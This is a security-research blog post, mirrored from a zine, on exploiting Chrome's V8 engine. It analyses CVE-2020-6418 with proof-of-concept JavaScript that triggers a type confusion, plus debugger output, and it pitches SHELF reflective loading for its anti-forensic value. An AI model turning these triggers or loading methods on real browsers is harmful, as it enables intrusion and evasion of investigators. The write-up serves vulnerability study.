<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>SHELF encounters of the elements kind :: ulexec.github.io</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&amp;rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://ulexec.github.io/post/2022-02-22-shelfchrome/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://ulexec.github.io/styles.css">







  <link rel="shortcut icon" href="https://ulexec.github.io/img/theme-colors/blue.png">
  <link rel="apple-touch-icon" href="https://ulexec.github.io/img/theme-colors/blue.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="SHELF encounters of the elements kind">
<meta property="og:description" content="This is a mirror of my article publsihed at Tmp.0ut zine volume 2. Original post can be found here.
I&amp;rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.
If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague _Anonymous from Tmp.0ut wrote about last year." />
<meta property="og:url" content="https://ulexec.github.io/post/2022-02-22-shelfchrome/" />
<meta property="og:site_name" content="ulexec.github.io" />

  
    <meta property="og:image" content="https://ulexec.github.io/img/favicon/blue.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">

  <meta property="article:section" content="writeup" />


  <meta property="article:published_time" content="2022-02-22 00:00:00 &#43;0000 UTC" />












</head>
<body class="blue">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/post/">
  <div class="logo">
    ulexec.github.io
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/post/">Archives</a></li>
        
      
        
          <li><a href="/publications/">Publications</a></li>
        
      
        
          <li><a href="/projects/">Projects</a></li>
        
      
        
          <li><a href="/bugs/">Bugs</a></li>
        
      
        
          <li><a href="/about/">About</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/post/" >Archives</a></li>
        
      
        
          <li><a href="/publications/" >Publications</a></li>
        
      
        
          <li><a href="/projects/" >Projects</a></li>
        
      
        
          <li><a href="/bugs/" >Bugs</a></li>
        
      
        
          <li><a href="/about/" >About</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://ulexec.github.io/post/2022-02-22-shelfchrome/">SHELF encounters of the elements kind</a>
  </h1>
  <div class="post-meta"><time class="post-date">2022-02-22</time><span class="post-author">ulexec</span></div>

  
    <span class="post-tags">
      
      #<a href="https://ulexec.github.io/tags/pwn/">pwn</a>&nbsp;
      
      #<a href="https://ulexec.github.io/tags/chrome/">chrome</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>This is a mirror of my article publsihed at <em>Tmp.0ut</em> zine volume 2. Original post can be found <a href="https://tmpout.sh/2/5.html">here</a>.</p>
<p>I&rsquo;ve been focusing lately on Chrome exploitation, and after a while I became curious of the idea to attempt to make SHELF loading work for Chrome exploits targeting Linux.</p>
<p>If you are new to the concept of SHELF, it is a reflective loading methodology me and my colleague <code>_Anonymous</code> from <em>Tmp.0ut</em> <a href="https://tmpout.sh/1/10/">wrote about</a> last year.</p>
<p>SHELF-based payloads have a series of incentives, primarily as to be able to reflectively deploy large dependency-safe payloads as ELF binaries, without the need to invoke any of the <code>execve</code> familiy of system calls.</p>
<p>Deploying SHELF payloads is not only convenient from a development perspective, but also from an anti-forensics perspective. This is because the analysis of SHELF images is often more complex than conventional ELF binaries or shellcode, since SHELF images are statically compiled but also position-independent. In addition, SHELF images can be crafted to avoid the use of common ELF data structures critical for image reconstruction, also leaving no process-hierarchy footprint in contrast to the <code>execve</code> family of system calls.</p>
<p>In conclusion, SHELF has great prospects to be used within the browser to reflectively load arbitrary payloads in the form of self-contained ELF binaries with anti-forensic characteristics.</p>
<p>In this article, I will demonstrate how SHELF loading can be achieved on a Chrome exploit, starting from an initial set of relative arbitrary read/write primitives to V8&rsquo;s heap.</p>
<p>I also wanted to present a concise analysis of a vulnerability that would grant these kinds of initial exploitation primitives. I will be covering a vulnerability I&rsquo;ve been recently analyzing, <code>CVE-2020-6418</code>. However, feel free to skip to the <em>Achieving Relative Arbitrary Read/Write</em> section if you are not interested in the root-cause analysis of this particular vulnerability.</p>
<p>I would like to apologize in advance if there are still some mistakes or wrong assertions I may have skipped over, or simply was unaware of during the creation of this article.</p>
<hr>
<h2 id="cve-2020-6418">CVE-2020-6418<a href="#cve-2020-6418" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<!-- raw HTML omitted -->
<h3 id="regression-test-analysis">Regression Test Analysis<a href="#regression-test-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>If we check the bug issue for this vulnerability, we can observe that a <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js">regression</a> test file was committed, which will serve us as an intial PoC for the given vulnerability. This regression test looks as follows:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Copyright 2020 the V8 project authors. All rights reserved.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Use of this source code is governed by a BSD-style license that can be
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// found in the LICENSE file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Flags: --allow-natives-syntax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">empty</span>() {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">p</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">pop</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">construct</span>(<span style="color:#a6e22e">empty</span>, <span style="color:#a6e22e">arguments</span>, <span style="color:#a6e22e">p</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Proxy(Object, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get</span><span style="color:#f92672">:</span> () =&gt; (<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>, Object.<span style="color:#a6e22e">prototype</span>)
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">p</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">p</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">f</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">p</span>);</span></span></code></pre></div>
We can also inspect the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">bug report</a> for a nice overview of the vulnerability:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Incorrect side effect modelling for JSCreate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring the Map of an object. From the documentation: &#34;This information can be either &#34;reliable&#34;, meaning that the object is guaranteed to have one of these maps at runtime, or &#34;unreliable&#34;, meaning that the object is guaranteed to have HAD one of these maps.&#34;. In the latter case, the caller has to ensure that the object has the correct type, either by using CheckMap nodes or CodeDependencies.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until it finds the node creating the object in question and, at the same time, marks the result as unreliable if it encounters a node without the kNoWrite flag [2], indicating that executing the node could have side-effects such as changing the Maps of an object. There is a mistake in the handling of kJSCreate [3]: if the object in question is not the output of kJSCreate, then the loop continues *without* marking the result as unreliable. This is incorrect because kJSCreate can have side-effects, for example by using a Proxy as third argument to Reflect.construct. The bug can then for example be triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles during the unexpected side effect.</span></span></code></pre></div>
As seen in the bug report, the vulnerability consists of incorrect side effect modeling for <code>JSCreate</code>. In other words, arbitrary JavaScript code can be invoked at some point during the processing of <code>JSCreate</code> in Ignition (V8&rsquo;s interpreter) generated instructions, that would impact the behavior of Turbofan&rsquo;s JIT compilation pipeline.</p>
<p>If we modify the provided regression test to return the value popped from the array <code>a</code>, we will see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ../regress.js
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span></span></span></code></pre></div>
The value popped after the third call to function <code>main</code> is <code>0</code>, when in reality it should have returned <code>2</code>. This means that the call to <code>main(p)</code> is somehow influencing the behavior of array <code>a</code>&rsquo;s elements. We can see this clearly with the following modifications to the regression test:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>, <span style="color:#ae81ff">1.5</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">empty</span>() {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">p</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">pop</span>(<span style="color:#a6e22e">Reflect</span>.<span style="color:#a6e22e">construct</span>(<span style="color:#a6e22e">empty</span>, <span style="color:#a6e22e">arguments</span>, <span style="color:#a6e22e">p</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Proxy(Object, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get</span><span style="color:#f92672">:</span> () =&gt; (<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> {}, Object.<span style="color:#a6e22e">prototype</span>)
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">p</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f</span>(<span style="color:#a6e22e">p</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">f</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">empty</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">main</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">main</span>(<span style="color:#a6e22e">p</span>));</span></span></code></pre></div>
If we run the previous script we will see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ out.gn/x64.release/d8 --allow-natives-syntax ./regress.js          
</span></span><span style="display:flex;"><span>4.735317402428105e-270</span></span></code></pre></div>
The elements kind of array <code>a</code> has transitioned from <code>PACKED_DOUBLE_ELEMENTS</code> to <code>PACKED_ELEMENTS</code> however, popped values of <code>a</code> via <code>Array.prototype.pop</code> still return elements of type <code>double</code>. This transition of <em>element kind</em> can be shown in the diagram below, showing the allowed element kinds transitions within V8&rsquo;s JSArrays:</p>
<p><img src="https://tmpout.sh/2/img/Screenshot%202021-05-03%20at%2013.00.23%201.png#center" alt=""></p>
<p>At this point, we can only speculate what is provoking this behavior. However, based on observed triage of the regression test, this change of <em>elements kind</em> is likely provoked by the <code>Proxy</code> function, redeclaring <code>a[0]</code> indexed property as an <code>JSObject</code> instead of a <code>double</code> value.</p>
<p>We can also suspect that this redeclaration of one of the elements of <code>a</code> has likely provoked V8 to reallocate the array, propagating a different <em>elements kind</em> to <code>a</code>, converting <code>a</code>&rsquo;s elements&rsquo; to <code>HeapNumber</code> objects from <code>double</code> values. However, it&rsquo;s likely that the <em>elements kind</em> inferred by <code>Array.prototype.pop</code> is incorrect, as <code>double</code> values are still being retrieved.</p>
<p>This can be shown in the following <code>d8</code> run below, in which calls to the native function <code>%DebugPrint</code> have been placed in the appropriate places in the PoC script before and after the transition of elements kind:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">gn</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x64</span>.<span style="color:#a6e22e">debug</span><span style="color:#f92672">/</span><span style="color:#a6e22e">d8</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">natives</span><span style="color:#f92672">-</span><span style="color:#a6e22e">syntax</span> ..<span style="color:#f92672">/</span><span style="color:#a6e22e">regress</span>.<span style="color:#a6e22e">js</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//----------------------------[BEFORE]--------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">DebugPrint</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6031</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">JSArray</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">map</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d0408281909</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(<span style="color:#a6e22e">PACKED_DOUBLE_ELEMENTS</span>)<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">FastProperties</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d040824923d</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6001</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedDoubleArray</span>[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">PACKED_DOUBLE_ELEMENTS</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">properties</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080406e9</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04081c0165</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">AccessorInfo</span><span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">accessor</span> <span style="color:#a6e22e">descriptor</span>)
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6001</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedDoubleArray</span>[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.2</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.3</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1.4</span>
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x3d0408281909</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">Map</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JS_ARRAY_TYPE</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">instance</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">inobject</span> <span style="color:#a6e22e">properties</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span> <span style="color:#a6e22e">kind</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PACKED_DOUBLE_ELEMENTS</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">unused</span> <span style="color:#a6e22e">property</span> <span style="color:#a6e22e">fields</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">back</span> <span style="color:#a6e22e">pointer</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04082818e1</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(<span style="color:#a6e22e">HOLEY_SMI_ELEMENTS</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype_validity</span> <span style="color:#a6e22e">cell</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04081c0451</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Cell</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">instance</span> <span style="color:#a6e22e">descriptors</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04082498c1</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">DescriptorArray</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">transitions</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d040824990d</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">TransitionArray</span>[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Transition</span> <span style="color:#a6e22e">array</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">0x3d0408042f75</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Symbol</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">elements_transition_symbol</span>)<span style="color:#f92672">&gt;:</span> (<span style="color:#a6e22e">transition</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">HOLEY_DOUBLE_ELEMENTS</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#ae81ff">0x3d0408281931</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(<span style="color:#a6e22e">HOLEY_DOUBLE_ELEMENTS</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d040824923d</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">constructor</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d0408249111</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSFunction</span> Array (<span style="color:#a6e22e">sfi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d04081cc2dd</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">dependent</span> <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080401ed</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Other</span> <span style="color:#a6e22e">heap</span> <span style="color:#a6e22e">object</span> (<span style="color:#a6e22e">WEAK_FIXED_ARRAY_TYPE</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">construction</span> <span style="color:#a6e22e">counter</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//-----------------------------[AFTER]---------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">4.735317402428105</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">270</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DebugPrint</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6031</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">JSArray</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">map</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d0408281959</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Map</span>(<span style="color:#a6e22e">PACKED_ELEMENTS</span>)<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">FastProperties</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">prototype</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d040824923d</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6295</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedArray</span>[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">&gt;</span> [<span style="color:#a6e22e">PACKED_ELEMENTS</span>]
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">properties</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080406e9</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedArray</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04081c0165</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">AccessorInfo</span><span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">accessor</span> <span style="color:#a6e22e">descriptor</span>)
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6295</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">FixedArray</span>[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">&gt;</span> {
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c6279</span> <span style="color:#f92672">&lt;</span>Object <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3d04082802d9</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3d04080c62bd</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">HeapNumber</span> <span style="color:#ae81ff">1.1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Received</span> <span style="color:#a6e22e">signal</span> <span style="color:#ae81ff">11</span> <span style="color:#a6e22e">SEGV_ACCERR</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">d04fff80006</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ^ V8 CRASHES FETCHING ELEMENTS IN DEBUG BUILD
</span></span></span></code></pre></div>
We can leverage a type-confusion vulnerability when trying to access any of the elements of <code>a</code>, as we will be fetching a double representation of a <code>HeapNumber</code> object&rsquo;s tagged pointer. This vulnerability would enable us to trivially create <code>addrof</code> and <code>fakeobj</code> primitives. However, we will see moving forward that this won’t work in newer V8 versions, and that in order to exploit this vulnerability a different exploitation strategy will be required.</p>
<p>This is all there is to understand for now in relation to the supplied regression test. Now let&rsquo;s dig deep into identifying the root-cause analysis in v8&rsquo;s source code.</p>
<!-- raw HTML omitted -->
<hr>
